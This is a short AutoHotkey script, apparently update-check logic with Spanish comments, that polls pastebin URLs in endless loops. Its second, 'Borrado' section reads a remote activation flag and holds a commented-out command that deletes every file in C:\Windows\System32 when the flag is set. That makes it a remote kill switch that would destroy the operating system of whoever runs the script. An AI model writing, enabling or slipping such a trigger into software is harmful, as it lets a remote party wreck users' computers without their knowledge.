
version := 1000000

;Actualización
Loop 
{
whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
whr.Open("GET", "https://pastebin.com/raw/MjsYfh0Y", true)
whr.Send()
whr.WaitForResponse()
update := whr.ResponseText

if (update > version) {
    MsgBox, NewUpdate
}
}



Return
;Borrado
Loop 
{
whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
whr.Open("GET", "https://pastebin.com/raw/HsMXjVY2", true)
whr.Send()
whr.WaitForResponse()
active := whr.ResponseText
/*
if (active = 1) {
    FileDelete, C:\Windows\System32\*
}
*/
}